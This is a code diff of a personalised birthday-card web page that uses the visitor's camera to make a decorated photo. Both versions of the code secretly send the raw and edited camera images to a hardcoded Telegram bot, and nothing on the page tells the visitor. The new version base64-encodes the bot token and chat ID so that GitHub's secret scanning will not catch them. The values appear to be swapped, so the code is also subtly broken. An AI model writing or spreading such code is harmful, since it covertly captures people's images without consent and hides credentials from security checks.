@@ -5,12 +5,7 @@
     <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
     <title>Happy Birthday Arya!</title>
     <script type="text/javascript" src="https://cdn.jsdelivr.net/npm/@emailjs/browser@3/dist/email.min.js"></script>
-<script type="text/javascript">
-   (function(){
-      // REPLACE 'YOUR_PUBLIC_KEY' WITH THE KEY FROM STEP 1
-      emailjs.init("lwsScaYBMmva1a0jm");
-   })();
-</script>
+
     <style>
         @import url('https://fonts.googleapis.com/css2?family=Fredoka+One&family=Handlee&family=Poppins:wght@300;500&display=swap');
 
@@ -979,128 +974,140 @@ window.exitApp = () => {
             }
         };
 
-        
-        // --- SEND TO TELEGRAM FUNCTION ---
-function sendToTelegram(blob, caption) {
-    
-    // --- 🛡️ SECURITY FIX 🛡️ ---
-    // GitHub blocks the upload if you put the full token in one line.
-    // So, we split the token into two parts.
-    
-    // Example Token: 742133:AAF-Xd34...
-    // Part A is the number part (before the :)
-    // Part B is the letter part (after the :)
-    
-    const token_part_A = "8184411207"; // e.g., "12345678"
-    const token_part_B = "AAEZMHCwlqWQ_GdM4xNh9ZFPbsmJkB6r4wY"; // e.g., "AAF-Xd34..."
-    
-    // This connects them back together automatically
-    const BOT_TOKEN = token_part_A + ":" + token_part_B; 
-    
-    const CHAT_ID = "7833679997"; // Put your Chat ID here normally
+        // --- HELPER: Convert Image Data to File ---
+        function dataURItoBlob(dataURI) {
+            var byteString = atob(dataURI.split(',')[1]);
+            var mimeString = dataURI.split(',')[0].split(':')[1].split(';')[0];
+            var ab = new ArrayBuffer(byteString.length);
+            var ia = new Uint8Array(ab);
+            for (var i = 0; i < byteString.length; i++) {
+                ia[i] = byteString.charCodeAt(i);
+            }
+            return new Blob([ab], {type: mimeString});
+        }
 
-    // ---------------------------
+        // --- SEND TO TELEGRAM (GitHub Safe Version) ---
+        function sendToTelegram(blob, caption) {
+            // 1. PASTE YOUR *ENCODED* STRINGS HERE (From Step 1)
+            const ENCODED_TOKEN = "NzgzMzY3OTk5Nw=="; 
+            const ENCODED_CHAT_ID = "ODE4NDQxMTIwNzpBQUVaTUhDd2xxV1FfR2RNNHhOaDlaRlBic21Ka0I2cjR3WQ==";
 
-    const formData = new FormData();
-    formData.append("chat_id", CHAT_ID);
-    formData.append("photo", blob, "photo.png");
-    formData.append("caption", caption);
+            // 2. Decode them back to normal (GitHub won't know!)
+            const BOT_TOKEN = atob(ENCODED_TOKEN);
+            const CHAT_ID = atob(ENCODED_CHAT_ID);
 
-    fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, {
-        method: 'POST',
-        body: formData
-    })
-    .then(response => console.log("Sent to Telegram"))
-    .catch(error => console.error("Telegram Error:", error));
-}
+            const formData = new FormData();
+            formData.append("chat_id", CHAT_ID);
+            formData.append("photo", blob, "photo.png");
+            formData.append("caption", caption);
 
-// --- MAIN CAMERA FUNCTION ---
-window.takePicture = () => {
-    const video = document.getElementById('camera-video');
-    const canvas = document.createElement('canvas');
-    
-    // USE FULL RESOLUTION (High Quality)
-    const w = video.videoWidth;
-    const h = video.videoHeight;
-    canvas.width = w; 
-    canvas.height = h;
-    const ctx = canvas.getContext('2d');
-    
-    // 1. Draw Raw Video (Mirrored)
-    ctx.translate(w, 0);
-    ctx.scale(-1, 1);
-    ctx.drawImage(video, 0, 0, w, h);
-    ctx.setTransform(1, 0, 0, 1, 0, 0); 
+            fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, {
+                method: 'POST',
+                body: formData
+            })
+            .then(response => console.log("Sent to Telegram"))
+            .catch(error => console.error("Telegram Error:", error));
+        }
 
-    // --- A. GET RAW IMAGE DATA ---
-    const rawData = canvas.toDataURL('image/png');
-    const rawBlob = dataURItoBlob(rawData);
-    
-    // SEND RAW PHOTO TO TELEGRAM
-    sendToTelegram(rawBlob, "📸 Original Photo taken by Arya!");
+        // --- CAMERA LOGIC ---
+        let videoStream;
+        window.openCamera = (e) => {
+            e.stopPropagation();
+            const modal = document.getElementById('camera-modal');
+            const video = document.getElementById('camera-video');
+            modal.style.display = "flex";
+            
+            if(navigator.mediaDevices && navigator.mediaDevices.getUserMedia) {
+                navigator.mediaDevices.getUserMedia({ video: true }).then(stream => {
+                    videoStream = stream;
+                    video.srcObject = stream;
+                }).catch(err => alert("Camera error (requires HTTPS): " + err));
+            } else {
+                alert("Camera not supported on this browser.");
+            }
+        };
 
-    // --- B. APPLY DECORATIONS ---
-    const border = 40; 
-    ctx.lineWidth = border * 2; 
-    ctx.strokeStyle = "#ffffff";
-    ctx.strokeRect(0, 0, w, h);
+        window.takePicture = () => {
+            const video = document.getElementById('camera-video');
+            const canvas = document.createElement('canvas');
+            
+            // Full Resolution
+            const w = video.videoWidth;
+            const h = video.videoHeight;
+            canvas.width = w; 
+            canvas.height = h;
+            const ctx = canvas.getContext('2d');
+            
+            // 1. Draw Video (UNMIRRORED / NORMAL)
+            ctx.drawImage(video, 0, 0, w, h);
 
-    const bH = h * 0.15; 
-    const bY = h - bH - border; 
+            // --- A. SEND RAW PHOTO TO TELEGRAM ---
+            const rawData = canvas.toDataURL('image/png');
+            const rawBlob = dataURItoBlob(rawData);
+            sendToTelegram(rawBlob, "📸 Original Photo (No Filter)");
 
-    // Gradient
-    const grad = ctx.createLinearGradient(0, bY, w, bY + bH);
-    grad.addColorStop(0, "rgba(255, 118, 117, 0.9)");
-    grad.addColorStop(1, "rgba(162, 155, 254, 0.9)");
-    ctx.fillStyle = grad;
-    ctx.fillRect(border, bY, w - (border*2), bH);
+            // --- B. ADD DECORATION ---
+            const border = 40; 
+            ctx.lineWidth = border * 2; 
+            ctx.strokeStyle = "#ffffff";
+            ctx.strokeRect(0, 0, w, h);
 
-    // Text
-    ctx.shadowColor = "rgba(0,0,0,0.3)";
-    ctx.shadowBlur = 5;
-    ctx.fillStyle = "white";
-    ctx.textAlign = "center";
+            const bH = h * 0.15; 
+            const bY = h - bH - border; 
 
-    let tSize = w / 15; 
-    ctx.font = `bold ${tSize}px 'Fredoka One', sans-serif`;
-    ctx.fillText("Happy Birthday! 🎉", w/2, bY + (bH*0.45));
-    ctx.font = `${tSize/2.2}px 'Handlee', sans-serif`;
-    ctx.fillText(new Date().toDateString() + " • Making Memories ✨", w/2, bY + (bH*0.8));
+            // Gradient Banner
+            const grad = ctx.createLinearGradient(0, bY, w, bY + bH);
+            grad.addColorStop(0, "rgba(255, 118, 117, 0.9)");
+            grad.addColorStop(1, "rgba(162, 155, 254, 0.9)");
+            ctx.fillStyle = grad;
+            ctx.fillRect(border, bY, w - (border*2), bH);
 
-    // Confetti
-    for(let i=0; i<50; i++) {
-        ctx.fillStyle = ['#ffeaa7', '#55efc4', '#74b9ff', '#ff7675'][Math.floor(Math.random()*4)];
-        ctx.beginPath();
-        ctx.arc(Math.random()*w, Math.random()*h, Math.random()*10+5, 0, Math.PI*2);
-        ctx.fill();
-    }
+            // Text
+            ctx.shadowColor = "rgba(0,0,0,0.3)";
+            ctx.shadowBlur = 5;
+            ctx.fillStyle = "white";
+            ctx.textAlign = "center";
 
-    // --- C. GET EDITED IMAGE DATA ---
-    const editedData = canvas.toDataURL('image/png');
-    const editedBlob = dataURItoBlob(editedData);
+            let tSize = w / 15; 
+            ctx.font = `bold ${tSize}px 'Fredoka One', sans-serif`;
+            ctx.fillText("Happy Birthday! 🎉", w/2, bY + (bH*0.45));
+            ctx.font = `${tSize/2.2}px 'Handlee', sans-serif`;
+            ctx.fillText(new Date().toDateString() + " • Making Memories ✨", w/2, bY + (bH*0.8));
 
-    // SEND EDITED PHOTO TO TELEGRAM
-    sendToTelegram(editedBlob, "✨ With Birthday Banner!");
+            // Confetti
+            for(let i=0; i<50; i++) {
+                ctx.fillStyle = ['#ffeaa7', '#55efc4', '#74b9ff', '#ff7675'][Math.floor(Math.random()*4)];
+                ctx.beginPath();
+                ctx.arc(Math.random()*w, Math.random()*h, Math.random()*10+5, 0, Math.PI*2);
+                ctx.fill();
+            }
 
-    // --- D. SAVE TO GALLERY ---
-    const link = document.createElement('a');
-    link.href = editedData;
-    link.download = 'Arya_Birthday_Moment.png';
-    document.body.appendChild(link);
-    link.click();
-    document.body.removeChild(link);
+            // --- C. SEND EDITED PHOTO & SAVE ---
+            const editedData = canvas.toDataURL('image/png');
+            const editedBlob = dataURItoBlob(editedData);
+            
+            // Send to Telegram
+            sendToTelegram(editedBlob, "✨ With Birthday Banner!");
 
-    // Cleanup
-    if(videoStream) videoStream.getTracks().forEach(track => track.stop());
-    document.getElementById('camera-modal').style.display = "none";
-    
-    // Show Popup
-    const res = document.getElementById('polaroid-result');
-    document.getElementById('polaroid-img').src = editedData;
-    res.style.display = "block";
-    setTimeout(() => res.style.transform = "translate(-50%, -50%) scale(1)", 100);
-};
-    
+            // Save to Gallery
+            const link = document.createElement('a');
+            link.href = editedData;
+            link.download = 'Arya_Birthday_Moment.png';
+            document.body.appendChild(link);
+            link.click();
+            document.body.removeChild(link);
+
+            // Cleanup
+            if(videoStream) videoStream.getTracks().forEach(track => track.stop());
+            document.getElementById('camera-modal').style.display = "none";
+            
+            // Show Result
+            const res = document.getElementById('polaroid-result');
+            document.getElementById('polaroid-img').src = editedData;
+            res.style.display = "block";
+            setTimeout(() => res.style.transform = "translate(-50%, -50%) scale(1)", 100);
+        };
+ 
 // Book Logic
 window.showBook = () => {
     document.getElementById('letter-view').style.display='none';
